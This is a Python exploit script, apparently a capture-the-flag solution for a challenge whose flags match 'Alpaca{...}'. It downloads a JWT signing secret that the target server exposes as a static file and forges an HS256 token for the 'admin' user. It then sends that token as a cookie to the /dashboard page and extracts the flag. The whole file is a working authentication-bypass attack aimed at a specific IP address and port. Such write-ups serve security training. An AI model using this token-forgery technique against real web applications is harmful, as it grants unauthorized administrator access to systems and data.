import requests
import base64
import hmac
import hashlib
import json
import time
import re


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")


def create_jwt(username: str, secret: str) -> str:
    header = json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":"))
    header_b64 = b64url_encode(header.encode())
    now = int(time.time())
    payload = json.dumps(
        {"sub": username, "iat": now, "exp": now + 3600}, separators=(",", ":")
    )
    payload_b64 = b64url_encode(payload.encode())
    msg = f"{header_b64}.{payload_b64}".encode()
    key = secret.encode()
    signature = hmac.new(key, msg, hashlib.sha256).digest()
    sig_b64 = b64url_encode(signature)

    return f"{header_b64}.{payload_b64}.{sig_b64}"


# サーバに応じて変更
base_url = "http://34.170.146.252:20812/"

secret_url = f"{base_url}/static/jwt_secret.txt"
resp = requests.get(secret_url, timeout=5)
if resp.status_code != 200:
    print(f"Failed to get secret: HTTP {resp.status_code}")
    exit(1)
secret = resp.text.strip()

token = create_jwt("admin", secret)

cookies = {"token": token}
resp = requests.get(f"{base_url}/dashboard", cookies=cookies, timeout=5)
response_text = resp.text

flag_match = re.search(r"Alpaca\{.*?\}", response_text)
if flag_match:
    flag = flag_match.group(0)
    print(flag)
else:
    print("Flag not found. Response snippet:")
    print(response_text[:1000])
    exit(1)
